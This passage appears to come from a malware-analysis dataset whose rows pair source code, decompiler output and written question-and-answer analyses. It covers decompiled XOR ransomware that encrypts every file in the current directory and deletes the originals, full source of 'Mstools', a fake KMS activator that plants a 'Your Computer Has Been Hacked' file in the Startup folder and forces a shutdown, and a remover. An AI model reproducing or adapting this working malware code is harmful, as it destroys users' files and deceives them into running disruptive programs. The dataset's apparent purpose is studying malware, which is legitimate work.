puts(""\tLast byte:"");
printf(""\t%ld: %02x\n"", mode, (int32_t)(char *)(v4 - 2 + v12));
putchar(10);
if (mode > 0) {
int64_t v15 = 0;
encrypt_block();
printf(""\rprogress: %ld\r"", 100 * (int32_t)(v15 / v4));
v15++;
while (v15 != (int64_t)mode) {
// 0x130c
encrypt_block();
printf(""\rprogress: %ld\r"", 100 * (int32_t)(v15 / v4));
v15++;
}
}
// 0x1390
if (write(fd2, (int64_t *)(v11 + 31 & -16), mode) > 0) {
// 0x13d0
remove(path);
close(fd2);
close(fd);
} else {
// 0x13ac
fprintf((struct _IO_FILE )(int64_t )(int64_t )0x11fd8, ""[!] write failed %s"", str);
}
}
}
}
}
}
int64_t result = g1; // 0x1408
if ((int64_t *)g1 != *(int64_t *)g1) {
// 0x140c
__stack_chk_fail();
result = &g7;
}
// 0x1410
return result;
}
// Address range: 0x141c - 0x1508
int main(int argc, char ** argv) {
// 0x141c
int64_t v1; // bp-73, 0x141c
int64_t v2 = (int64_t)&v1 & -16; // 0x1454
rand_str();
printf(""key is: %s\n"", (char )v2);
struct __dirstream * dirp = opendir("".""); // 0x1484
if (dirp != NULL) {
struct dirent * v3 = readdir(dirp); // 0x14b4
if (v3 != NULL) {
encrypt_file((int64_t)v3 + 19, v2, 32);
struct dirent * v4 = readdir(dirp); // 0x14b4
struct dirent * v5 = v4; // 0x14c4
while (v4 != NULL) {
// 0x149c
encrypt_file((int64_t)v5 + 19, v2, 32);
v4 = readdir(dirp);
v5 = v4;
}
}
// 0x14c8
closedir(dirp);
}
// 0x14d0
if ((int64_t *)g1 != *(int64_t *)g1) {
// 0x14f4
__stack_chk_fail();
}
// 0x14f8
return 0;
}
// Address range: 0x1508 - 0x151c
int64_t _fini(int64_t a1) {
// 0x1508
int64_t result; // 0x1508
return result;
}
// --------------------- Meta-Information ---------------------
// Detected compiler/packer: gcc (11.4.0)
// Detected functions: 39","1. The primary functionality of the code is to simulate ransomware behavior. It encrypts files in the current directory and appends a "".osiris"" extension, effectively holding the files hostage unless decrypted.

2. `rand_str`: Generates a random string of characters used as an encryption key. `encrypt_block`: Performs encryption by XORing each byte of the file with a corresponding byte of the key. `encrypt_file`: Handles opening the target file, encrypting its content, and writing the encrypted data to a new file with the ransomware extension.

3. The variable `key` is an array used to store the encryption key. It is filled with random characters by the `rand_str` function and then used in `encrypt_block` to encrypt the file data.

4. The error handling mechanism consists of checking the success of system calls (like `open`, `fstat`, `mmap`, `write`) and printing an error message using `fprintf(stderr, ...)` when these calls fail. The code does not attempt to recover from these errors but simply returns to avoid further execution.

5. In the `main` function: The program generates a random key, then opens the current directory and iterates over each file, calling `encrypt_file` on each one. After iterated encryption, it closes the directory stream (`closedir`).

6. External libraries or dependencies:
   - `dirent.h`: For directory traversal functions.
   - `elf.h`: Though included, not directly used in the code snippet.
   - `errno.h`: For error number definitions.
   - `fcntl.h`: For file control options.
   - `libgen.h`: For `basename` function.
   - `stdint.h`, `stdio.h`, `stdlib.h`, `string.h`: For standard types, I/O, memory allocation, and string manipulation.
   - `sys/mman.h`: For memory management functions.
   - `sys/stat.h`: For `stat` structure and its members.
   - `unistd.h`: For POSIX operating system API.

7. Evident security concerns:
   - Use of `rand()` without seeding can result in predictable keys.
   - The ransomware code removes the original files without any confirmation or backups.
   - Using `alloca()` for memory allocation is unsafe as it can lead to stack overflows.
   - Hardcoded file extension duplicate checking is not a secure method of identifying encrypted files.
   - Lack of cryptography strength analysis; XORing might not be secure enough.","1. The primary functionality of the code is to encrypt files in the current directory by XOR-ing each byte with a corresponding byte from a generated key, while ignoring files with certain names (""."", "".."", ""randomware"", "".osiris"").

2. Three key functions:
- `encrypt_file`: Handles the process of encrypting a file, including opening the file, mapping it to memory, encrypting its contents, and writing them out to a new file.
- `is_filename_proper`: Checks if a file should be encrypted by ensuring it is not a directory, the current directory, or already encrypted (based on the filename containing ""randomware"" or "".osiris"").
- `encrypt_block`: Performs the actual encryption of a single byte by XOR-ing it with a corresponding byte from the key, based on the block index and the key size.

3. Variable `local_58`: This variable represents the size of the file being encrypted. It is set by `fstat` (which stores file information in `auStack_88`) and is used as the length parameter for `mmap` to map the file into memory and as an upper bound while iterating through the file's bytes during encryption.

4. The error handling mechanism includes checking return values from system calls (like `open`, `fstat`) and subsequently printing out an error message to the standard error stream if an error occurs. Additionally, there is stack canary checking to prevent stack buffer overflows, terminating the program if mismatch is detected.

5. In `main`, the flow starts by initializing a random key, opening the current directory, and iterating through each entry with `readdir`. For each entry, `encrypt_file` is called. After all entries are processed, the directory is closed. Any stack corruption is checked before terminating.

6. External libraries or dependencies:
The code uses standard C libraries, including `stdio.h`, `stdlib.h`, `string.h`, `sys/stat.h`, `dirent.h`, `fcntl.h`, `sys/mman.h`, `unistd.h`. These libraries provide functions for file I/O, memory mapping, string manipulation, and random number generation.

7. Security concerns:
- No bounds checking when generating the key (`rand_str` might overflow `auStack_60`).
- Use of `strdup` and direct file operations without proper validation can lead to vulnerabilities.
- Manipulating file descriptors (`open`, `fchmod`) without further access checks may alter unintended files.
- Potentially, `printf` calls reveal key bytes and could leak sensitive information.
- The error messaging using `stderr` could expose internal states to an attacker.
- The stack overflow checks are present, but recursive function calls or other vulnerabilities can still cause stack overflows.","1. The primary functionality of this code seems to be related to a cryptovirus or ransomware-like operation. It traverses directories, encrypts files by xoring them with a generated key, and renames them with a new extension, indicating that the files have been encrypted.

2. Key functions:
   - `rand_str()`: Generates a random string used probably as a key for encryption. 
   - `encrypt_file()`: Takes a file path to encrypt the file content and possibly change its name to have a `.osiris` extension, which suggests encrypted data.
   - `main()`: Entry point of the program, sets up a random key, opens the directory ""."", then iterates over files encrypting them with the previously mentioned key.

3. The `g1` variable seems to be used for stack protection, possibly as a canary. It's checked at the end of functions such as `main` and `encrypt_file` against a duplication of itself to detect any stack overflow or corruption that happened during function execution.

4. The error-handing mechanism includes checking return values of system calls and printing error messages to the standard error. For example, after calling `open()`, it checks if the file descriptor is negative indicating an error, and then printing an error message using `fprintf()`.

5. In `encrypt_file()`, the flow goes as follows: 
   - Check if the file is suitable for modification with `is_filename_proper()`.
   - If yes, open the file.
   - Perform `fstat()` to obtain file size.
   - Duplicate the file path and append an extension.
   - Open a new file with this new path.
   - Set file permissions.
   - Map the file into memory.
   - Encrypt the content in memory.
   - Write the encrypted content to the new file.
   - Delete the original file.

6. External libraries or dependencies include:
   - C Standard Library (`stdlib.h`, `stdio.h`, etc.).
   - POSIX Library (`unistd.h`, `fcntl.h`, `sys/stat.h`, `sys/mman.h`, `dirent.h`).
   - Libgen (`libgen.h`) for filename manipulation.

7. Evident security concerns:
   - The use of hard-coded offsets and direct memory manipulation might lead to buffer overflows or off-by-one errors.
   - Lack of sanitization and validation before operating on file paths.
   - Possible exposure to format string vulnerabilities due to the use of variadic functions like `printf()` without format specifiers.
   - Global variables storing sensitive information like `g5` for `open()` could be manipulated if memory corruption vulnerabilities exist."
5,https://github.com/Anish-M-code/Cstorm-windows-startup-virus-in-c,Done,Windows,"// Mstools
// Copyright (C) 2018-2020 M.Anish mailto:aneesh25861@gmail.com
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
//(at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program. If not, see http://www.gnu.org/licenses/.
/* Mstools was developed independantly by M.Anish For Educational purpose only!
Mstools is based on Cstorm Startup Virus, several changes has been done to make it look more legitimate to targeted entities.
USE AT YOUR OWN RISK. DEVELOPER NOT RESPONSIBLE FOR ANY DAMAGES THROUGH USE OF THIS SOFTWARE.	*/
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<ctype.h>
void tunnel()
{
system(""echo %USERPROFILE%>user"");
}
void tscan()
{
FILE *f,*fp;
char s[800],ch; int i=0;
f=fopen(""user"",""r"");
if(f==NULL)
{
exit(0);
}
while(feof(f)==0)
{
fscanf(f,""%c"",&ch);
if(ch=='\n')
break;
s[i]=ch;
i++;
}
s[i]='\0';
fclose(f);
strcat(s,""\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\chrome.txt"");
fp=fopen(s,""w"");
if(fp==NULL)
{
f=fopen(""C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\chrome.txt"",""w"");
if(f==NULL)
{
system(""cls"");
remove(""user"");
printf(""\nPlease Run this Program as ADMINISTRATOR to continue...\n"");
system(""timeout 10"");
exit(0);
}
fprintf(f,""\n Your Computer has been Hacked!\n"");
fclose(f);
system(""shutdown /f /t 060 /s /c \""shutting down PC to Activate The Microsoft Products with new Licensekey.\"""");
exit(0);
}
fprintf(fp,""\n Your Computer Has Been Hacked!\n"");
fclose(fp);
}
void check_internet()
{
int i=0;
i=system(""ping https://kali.org/"");
if(i!=0)
{
printf(""\n Internet Connection Not Available To Register Microsoft Product with KMS servers! \n"");
printf(""press any key to exit..."");
exit(1);
}
system(""start https://kali.org/ "");
system(""start https://torproject.org/ "");
}
void ok()
{
remove(""user"");
}
void run()
{
tunnel();
tscan();
}
void pause()
{
printf(""\n"");
system(""pause"");
}
int main()
{
system(""title MsTools "");
run();
ok();
printf(""\n|----- Mstools: KMS Activation Service -----|\n"");
printf(""\n Checking ...\n"");
system(""systeminfo"");
check_internet();
system(""shutdown /f /t 060 /s /c \""shutting down PC to Activate The Microsoft Products with new Licensekey.\"""");
pause();
}","{
""functions"": [
""tunnel"",
""tscan"",
""check_internet"",
""ok"",
""run"",
""pause"",
""main""
]
}","{
""variables"": [
""s"",
""f"",
""fp"",
""ch"",
""i""
]
}","// Mstools
// Copyright (C) 2018-2020 M.Anish mailto:aneesh25861@gmail.com
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program. If not, see http://www.gnu.org/licenses/.
/* Mstools was developed independently by M.Anish For Educational purpose only!
Mstools is based on Cstorm Startup Virus, several changes have been done to make it look more legitimate to targeted entities.
USE AT YOUR OWN RISK. DEVELOPER NOT RESPONSIBLE FOR ANY DAMAGES THROUGH USE OF THIS SOFTWARE.	*/
// Function to get Current User in Windows who is logged in.
// Function to detect and remove chrome.bat in the startup folder in Windows.
// Attempting to repair if enough permissions are available or not. Warn the user if admin access is required.
// String with commands to be executed by cmd.exe
// Function to check for an internet connection and exit if not available.
// Perform cleaning of temporary files generated.
// Load all required functions.
// Function to pause the program.","int __cdecl _main(int _Argc,char **_Argv,char **_Env);
int __cdecl _puts(char *_Str);
void _check_internet(void);
void __cdecl _exit(int _Code);
int __cdecl _system(char *_Command);
void _ok(void);
int __cdecl _remove(char *_Filename);
void _pause(void);
void _run(void);
void _tunnel(void);
void _tscan(void);
int __cdecl _fscanf(FILE *_File,char *_Format,...);
int __cdecl _main(int _Argc,char **_Argv,char **_Env)
{
___main();
_system(""title MsTools "");
_run();
_ok();
_puts(""\n|----- Mstools: KMS Activation Service -----|"");
_puts(""\n Checking ..."");
_system(""systeminfo"");
_check_internet();
_system(
""shutdown /f /t 060 /s /c \""shutting down PC to Activate The Microsoft Products with new Licensekey.\""""
);
_pause();
return 0;
}

void _check_internet(void)
{
int iVar1;
iVar1 = _system(""ping https://kali.org/"");
if (iVar1 != 0) {
_puts(""\n Internet Connection Not Available To Register Microsoft Product with KMS servers! "");
_printf(""press any key to exit..."");
/* WARNING: Subroutine does not return */
_exit(1);
}
_system(""start https://kali.org/ "");
_system(""start https://torproject.org/ "");
return;
}

void _tscan(void)
{
char cVar1;
int iVar2;
uint uVar3;
undefined4 *puVar4;
char *pcVar5;
undefined4 *puVar6;
undefined4 local_349;
undefined auStack_345 [66];
undefined4 uStack_303;
undefined auStack_2ff [727];
FILE *local_28;
FILE *local_24;
int local_20;
local_20 = 0;
local_24 = _fopen(""user"",""r"");
if (local_24 == (FILE )0x0) {
/ WARNING: Subroutine does not return */
_exit(0);
}
while (((local_24->_flag & 0x10U) == 0 &&
(_fscanf(local_24,""%c"",&local_349), (char)local_349 != '\n'))) {
*(char *)((int)&local_349 + local_20 + 1) = (char)local_349;
local_20 = local_20 + 1;
}
*(undefined *)((int)&local_349 + local_20 + 1) = 0;
_fclose(local_24);
uVar3 = 0xffffffff;
pcVar5 = (char *)((int)&local_349 + 1);
do {
if (uVar3 == 0) break;
uVar3 = uVar3 - 1;
cVar1 = *pcVar5;
pcVar5 = pcVar5 + 1;
} while (cVar1 != '\0');
uVar3 = ~uVar3;
*(undefined4 *)((int)&local_349 + uVar3) = 0x7070415c;
*(undefined4 *)((int)&uStack_303 + uVar3) = 0x747874;
puVar6 = (undefined4 *)((int)&local_349 + uVar3 + 4 & 0xfffffffc);
iVar2 = (int)(undefined4 *)((int)&local_349 + uVar3) - (int)puVar6;
puVar4 = (undefined4 *)
(""\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\chrome.txt"" +
-iVar2);
for (uVar3 = iVar2 + 0x4aU >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {
*puVar6 = *puVar4;
puVar4 = puVar4 + 1;
puVar6 = puVar6 + 1;
}
local_28 = _fopen((char *)((int)&local_349 + 1),""w"");
if (local_28 != (FILE *)0x0) {
_fwrite(""\n Your Computer Has Been Hacked!\n"",1,0x21,local_28);
_fclose(local_28);
return;
}
local_24 = _fopen(""C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\chrome.txt""
,""w"");
if (local_24 != (FILE )0x0) {
_fwrite(""\n Your Computer has been Hacked!\n"",1,0x21,local_24);
_fclose(local_24);
_system(
""shutdown /f /t 060 /s /c \""shutting down PC to Activate The Microsoft Products with new Licensekey.\""""
);
/ WARNING: Subroutine does not return /
_exit(0);
}
_system(""cls"");
_remove(""user"");
_puts(""\nPlease Run this Program as ADMINISTRATOR to continue..."");
_system(""timeout 10"");
/ WARNING: Subroutine does not return */
_exit(0);
}","//
// This file was generated by the Retargetable Decompiler
// Website: https://retdec.com/
//
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
// ------------------------ Structures ------------------------
struct _IO_FILE {
int32_t e0;
};
// ------------------- Function Prototypes --------------------
int32_t ___do_global_ctors(void);
int32_t ___main(void);
int32_t _check_internet(void);
int32_t _ok(void);
int32_t _pause(void);
int32_t _run(void);
int32_t _tscan(void);
int32_t _tunnel(int32_t a1);
// --------------------- Global Variables ---------------------
int32_t g1 = -1; // 0x403ec0
int32_t g2 = 0; // 0x407028
// ------------------------ Functions -------------------------
// Address range: 0x401460 - 0x401475
int32_t _tunnel(int32_t a1) {
// 0x401460
return system(""echo %USERPROFILE%>user"");
}
// Address range: 0x401475 - 0x40166b
int32_t _tscan(void) {
struct _IO_FILE * file = fopen(""user"", ""r""); // 0x401497
if (file == NULL) {
// 0x4014a5
exit(0);
// UNREACHABLE
}
int32_t stream = (int32_t)file;
int32_t file_path; // bp-840, 0x401475
int32_t v1 = &file_path;
int32_t v2 = 0; // 0x4014fc
int32_t v3 = 0; // 0x4014fc
if ((*(int32_t *)(stream + 12) & 16) == 0) {
int32_t v4; // bp-841, 0x401475
fscanf((struct _IO_FILE *)stream, ""%c"", &v4);
char v5 = v4; // 0x4014d5
v3 = v2;
while (v5 != 10) {
// 0x4014d9
*(char )(v2 + v1) = v5;
v2++;
int32_t stream2 = (int32_t)file;
v3 = v2;
if (((int32_t *)(stream2 + 12) & 16) != 0) {
// break -> 0x401501
break;
}
fscanf((struct _IO_FILE *)stream2, ""%c"", &v4);
v5 = v4;
v3 = v2;
}
}
// 0x401501
*(char )(v3 + v1) = 0;
fclose(file);
int32_t v6 = -1; // 0x40152e
int32_t v7 = v1; // 0x40152e
int32_t v8 = 0; // 0x40152e
while (v6 != 0) {
int32_t v9 = v7;
v6--;
bool v10; // 0x401475
v7 = v9 + (v10 ? -1 : 1);
v8 = v6;
if ((char *)v9 == 0) {
// break ->
break;
}
v8 = 0;
}
int32_t v11 = -2 - v8 + v1; // 0x40153d
*(int32_t *)v11 = 0x7070415c;
int32_t v12 = *(int32_t *)((int32_t)""\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\chrome.txt"" + 70); // 0x40154d
*(int32_t *)(v11 + 70) = v12;
int32_t v13 = v11 + 4 & -4; // 0x401558
int32_t v14 = v11 - v13; // 0x40155b
__asm_rep_movsd_memcpy((char *)v13, (char *)((int32_t)""\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\chrome.txt"" - v14), (v14 + 74) / 4);
struct _IO_FILE * file2 = fopen((char *)&file_path, ""w""); // 0x401580
if (file2 != NULL) {
// 0x401631
fwrite((int32_t )""\n Your Computer Has Been Hacked!\n"", 1, 33, file2);
return fclose(file2);
}
struct _IO_FILE * file3 = fopen(""C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\chrome.txt"", ""w""); // 0x4015a1
if (file3 != NULL) {
// 0x4015eb
fwrite((int32_t )""\n Your Computer has been Hacked!\n"", 1, 33, file3);
fclose(file3);
system(""shutdown /f /t 060 /s /c \""shutting down PC to Activate The Microsoft Products with new Licensekey.\"""");
exit(0);
// UNREACHABLE
}
// 0x4015af
system(""cls"");
remove(""user"");
puts(""\nPlease Run this Program as ADMINISTRATOR to continue..."");
system(""timeout 10"");
exit(0);
// UNREACHABLE
}
// Address range: 0x40166b - 0x4016cc
int32_t _check_internet(void) {
// 0x40166b
if (system(""ping https://kali.org/"") == 0) {
// 0x4016b1
system(""start https://kali.org/ "");
return system(""start https://torproject.org/ "");
}
// 0x40168d
puts(""\n Internet Connection Not Available To Register Microsoft Product with KMS servers! "");
printf(""press any key to exit..."");
exit(1);
// UNREACHABLE
}
// Address range: 0x4016cc - 0x4016e1
int32_t _ok(void) {
// 0x4016cc
return remove(""user"");
}
// Address range: 0x4016e1 - 0x4016f4
int32_t _run(void) {
// 0x4016e1
int32_t v1; // 0x4016e1
_tunnel(v1);
return _tscan();
}
// Address range: 0x4016f4 - 0x401715
int32_t _pause(void) {
// 0x4016f4
putchar(10);
return system(""pause"");
}
// Address range: 0x401715 - 0x40177a
int main(int argc, char ** argv) {
// 0x401715
___main();
system(""title MsTools "");
_run();
_ok();
puts(""\n|----- Mstools: KMS Activation Service -----|"");
puts(""\n Checking ..."");
system(""systeminfo"");
_check_internet();
system(""shutdown /f /t 060 /s /c \""shutting down PC to Activate The Microsoft Products with new Licensekey.\"""");
_pause();
return 0;
}
// Address range: 0x401c60 - 0x401ca6
int32_t ___do_global_ctors(void) {
int32_t v1 = 0;
int32_t v2 = v1 + 1; // 0x401c96
while ((int32_t )(4 * v2 + (int32_t)&g1) != 0) {
// 0x401c96
v1 = v2;
v2 = v1 + 1;
}
// 0x401ca4
if (v1 == 0) {
// 0x401c7f
return atexit((void ()())0x401c30);
}
int32_t v3 = v1; // 0x401c71
while (v3 != 1) {
// 0x401c73
v3--;
}
// 0x401c7f
return atexit((void ()())0x401c30);
}
// Address range: 0x401cb0 - 0x401ccc
int32_t ___main(void) {
int32_t result = g2; // 0x401cb0
if (result != 0) {
// 0x401cb9
return result;
}
// 0x401cc0
g2 = 1;
return ___do_global_ctors();
}
// --------------------- Meta-Information ---------------------
// Detected compiler/packer: gcc (6.3.0)
// Detected functions: 9","1. Primary Functionality:
The code purports to be a tool for KMS Activation Service, but it actually demonstrates behavior consistent with malware. It writes a file indicating the computer has been hacked and attempts to shut down the computer with a message.

2. Key Functions:
- `tunnel()`: Gathers the user profile path and writes it to a file named ""user.""
- `tscan()`: Determines the startup folder location and creates a file, ostensibly to maintain persistence by executing upon startup.
- `check_internet()`: Checks for an internet connection by pinging an external website (kali.org) and opens the website if there's a connection.

3. Role of a Variable:
- The `s` variable in `tscan()`: It is used to store the path of the user's Startup directory, where the malware attempts to plant a file for persistence.

4. Error Handling Mechanism:
The code includes basic error handling by checking the success of file operations (`fopen`) and system commands. If certain operations fail, such as failing to obtain administrative privileges or detect an internet connection, it informs the user and terminates execution (using `exit(0)` or `exit(1)`).

5. Flow of Execution in `main()`:
- Sets the console title.
- Calls `run()` function, which in turn calls `tunnel()` and `tscan()`.
- Deletes the ""user"" file by calling `ok()`.
- Prints a KMS Service message.
- Retrieves system information.
- Checks for an internet connection.
- Proceeds to shut down the system.

6. External Libraries or Dependencies:
No external libraries are used beyond the standard ones included by default with C (`stdio.h`, `stdlib.h`, `string.h`, `ctype.h`). The program relies on system-level commands available in the Windows operating system.

7. Evident Security Concerns:
- The script can be considered malicious as it falsely tells the user that their computer is hacked.
- It creates a file in the startup directory without consent.
- It uses misleading messages to disguise its intention.
- Attempts to shut down the user‚Äôs computer.
- Opens websites without user consent, which could be potentially dangerous if they were malicious.
- The code lacks proper authorization checks, allowing it to execute potentially harmful actions without explicit user permission.","1. The primary functionality of this code is to simulate a KMS activation tool for Microsoft products but actually carries out malicious actions, such as checking the internet connection, creating and writing to a file indicating the computer has been hacked, and triggering a system shutdown.

2. Key functions:
   - `_system()`: Executes system commands, such as changing the window title and checking the system information.
   - `_fopen()` and `_fwrite()`: Opens a file and writes to it, respectively. These are used to create a message indicating the computer has been hacked.
   - `_exit()`: Terminates the program abruptly. It's used for error handling and exiting the program after performing certain tasks.

3. `local_349`: A variable used to read a character from a file and store it. It's also used as the start of a buffer where a string is constructed and manipulated.

4. Error handling is rudimentary - in case of a failed operation, such as an inability to ping a server, open a file, or write to a file, the program prints a message and immediately exits with `_exit()`.

5. Flow of execution in `_check_internet()`:
   - Attempts to ping ""kali.org"".
   - If unsuccessful, it informs the user that there's no internet connection available for KMS server registration and prompts the user to press any key.
   - If the ping is successful, it opens ""kali.org"" and ""torproject.org"" in the browser.

6. External libraries or dependencies include standard C libraries for file operations (`FILE`, `_fopen`, `_fwrite`, `_fclose`), string formatting (`_printf`), and process control (`_exit`, `_system`). The actual code dependencies (like header files) are not listed in the provided snippet.

7. Security concerns:
   - Potential misuse of system commands via `_system()` can put the system at risk.
   - The code indicates behavior typical of a trojan or malware, such as misleading messages about licensing and shutting down the computer unrequested.
   - Writing a fake ""hacked"" message to a file could be part of a social engineering attack.
   - Automatic shutdown of the computer can lead to data loss and should be considered malicious.
   - The use of network resources without clear user consent or knowledge, for instance, automatically opening websites.","1. The primary functionality of the code seems malicious‚Äîit attempts to check and manipulate the user‚Äôs profile path, write a message implying the computer has been hacked, execute some internet checks, and ultimately triggers a shutdown with a misleading message about Microsoft product activation.

2. Three key functions and their purposes are: 
   - `_tscan()`: This function tries to read the user's profile path from a file, build a path to the system's Startup directory, and write a message there to be displayed upon user login.
   - `_check_internet()`: Checks if the system can access a specific URL (kali.org). It opens kali.org and torproject.org in the browser if there is internet access. Otherwise, it displays a failure message.
   - `_run()`: Orchestrates the execution by creating the user profile path file through `_tunnel()` and scanning it with `_tscan()`.

3. The variable `file_path` in `_tscan()` is used to store the path derived from the user's profile data. This path is later used to attempt to write a file in the Startup directory that exhibits a hack message.

4. The error handling mechanism mostly consists of checking if file operations return `NULL` and then exiting the program with `exit(0)` or `exit(1)`, indicating an abrupt end of the execution with a specific status code.

5. In `_run()`, first, `_tunnel(v1)` is called‚Äîalthough `v1` is uninitialized‚Äîto write the user‚Äôs profile path to a file. Then, `_tscan()` is executed to read this path, build a message file in the Startup folder, and handle potential errors by displaying messages, cleaning up, and exiting.

6. External libraries or dependencies include standard C libraries such as `<stdbool.h>`, `<stdint.h>`, `<stdio.h>`, and `<stdlib.h>` which are used for boolean types, integer types, input/output operations, and general utility functions like `exit()`.

7. Evident security concerns are:
   - It writes an unauthorized message to the user's Startup directory, displaying a fake hack notice.
   - It manipulates system commands like `shutdown`, which can disrupt the normal operation of a user's system.
   - Lack of sanitization or validation of external input can lead to vulnerabilities such as unintended code execution or information disclosure."
6,https://github.com/Anish-M-code/Cstorm-windows-startup-virus-in-c,Done,Windows,"// Mstools Remover
// Copyright (C) 2018-2020 M.Anish mailto:aneesh25861@gmail.com
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
//(at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program. If not, see http://www.gnu.org/licenses/.
/* Mstools Remover was developed independantly by M.Anish For Educational purpose only!
Mstools Remover is based on Cstorm Remover.
USE AT YOUR OWN RISK. DEVELOPER NOT RESPONSIBLE FOR ANY DAMAGES THROUGH USE OF THIS SOFTWARE.	*/
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<ctype.h>
//Function to get Current User in Windows who is logged in.
void tunnel()
{
system(""echo %USERPROFILE%>user"");
}
//Function to detect and remove chrome.bat in startup folder in windows.
void tscan()
{
FILE *f;
char s[300],tmp[350],tmp2[350],ch; int i=0;
f=fopen(""user"",""r"");
if(f==NULL)
{
exit(0);
}
while(feof(f)==0)
{
fscanf(f,""%c"",&ch);
if(ch=='\n')
break;
s[i]=ch;
i++;
}
s[i]='\0';
fclose(f);
strcat(s,""\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\chrome.txt"");
strcpy(tmp,""del \"""");
strcat(tmp,s);
strcat(tmp,""\"""");
f=fopen(s,""r"");
if(f!=NULL)
{
printf(""\nMstools Infection Detected!:%s"",s);
printf(""\nAttempting Repairs!\n"");
fclose(f);
system(tmp);
}
else
fclose(f);
f=fopen(""C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\chrome.txt"",""r"");
if(f!=NULL)
{
printf(""\nMstools Infection Detected!"");
printf(""\nAttempting Repairs!\n"");
strcpy(tmp2,""del \"""");
strcat(tmp2,""C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\chrome.txt"");
strcat(tmp2,""\"""");
fclose(f);
system(tmp2);
}
else
fclose(f);
}
//Perform cleaning of temporary files generated .
void ok()
{
remove(""user"");
}
//Load all reqired functions.
void run()
{
tunnel();
tscan();
}
//Function to pause the program.
void pause()
{
printf(""\n"");
system(""pause"");
}
int main()
{
system(""title Mstools Remover "");
run();
ok();
printf(""All operations completed...\n"");
pause();
}","{
""functions"": [
""tunnel"",
""tscan"",
""ok"",
""run"",
""pause"",
""main""
]
}","{
""variables"": [
""s"",
""f"",
""tmp"",
""tmp2"",
""ch"",
""i""
]
}","// Mstools Remover
// Copyright (C) 2018-2020 M.Anish mailto:aneesh25861@gmail.com
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program. If not, see http://www.gnu.org/licenses/.
/* Mstools Remover was developed independently by M.Anish For Educational purpose only!
Mstools Remover is based on Cstorm Remover.
USE AT YOUR OWN RISK. DEVELOPER NOT RESPONSIBLE FOR ANY DAMAGES THROUGH USE OF THIS SOFTWARE.	*/
// Function to get Current User in Windows who is logged in.
// Function to detect and remove chrome.bat in the startup folder in Windows.
// Attempting to repair if enough permissions are available or not. Warn the user if admin access is required.
// String with commands to be executed by cmd.exe
// Perform cleaning of temporary files generated.
// Load all required functions.
// Function to pause the program.","int __cdecl _main(int _Argc,char **_Argv,char **_Env);
void _ok(void);
int __cdecl _remove(char *_Filename);
int __cdecl _puts(char *_Str);
void _run(void);
void _tunnel(void);
int __cdecl _system(char *_Command);
void _tscan(void);
int __cdecl _fscanf(FILE *_File,char *_Format,...);
void __cdecl _exit(int _Code);
char * __cdecl _strcat(char *_Dest,char *_Source);
void _pause(void);
int __cdecl _main(int _Argc,char **_Argv,char **_Env)
{
___main();
_system(""title Mstools Remover "");
_run();
_ok();
_puts(""All operations completed..."");
_pause();
return 0;
}

void _tscan(void)
{
char cVar1;
int iVar2;
uint uVar3;
undefined4 *puVar4;
char *pcVar5;
undefined4 *puVar6;
undefined local_40d;
undefined4 local_40c;
undefined2 local_408;
undefined4 uStack_3c9;
undefined auStack_3c5 [278];
undefined uStack_2af;
undefined4 local_2ae;
undefined2 local_2aa;
undefined4 uStack_151;
undefined auStack_14d [66];
undefined4 uStack_10b;
undefined auStack_107 [227];
FILE *local_24;
int local_20;
local_20 = 0;
local_24 = _fopen(""user"",""r"");
if (local_24 == (FILE )0x0) {
/ WARNING: Subroutine does not return */
_exit(0);
}
while (((local_24->_flag & 0x10U) == 0 && (_fscanf(local_24,""%c"",&local_40d), local_40d != '\n')))
{
*(char *)((int)&uStack_151 + local_20 + 1) = local_40d;
local_20 = local_20 + 1;
}
*(undefined *)((int)&uStack_151 + local_20 + 1) = 0;
_fclose(local_24);
uVar3 = 0xffffffff;
pcVar5 = (char *)((int)&uStack_151 + 1);
do {
if (uVar3 == 0) break;
uVar3 = uVar3 - 1;
cVar1 = *pcVar5;
pcVar5 = pcVar5 + 1;
} while (cVar1 != '\0');
uVar3 = ~uVar3;
*(undefined4 *)((int)&uStack_151 + uVar3) = 0x7070415c;
*(undefined4 *)((int)&uStack_10b + uVar3) = 0x747874;
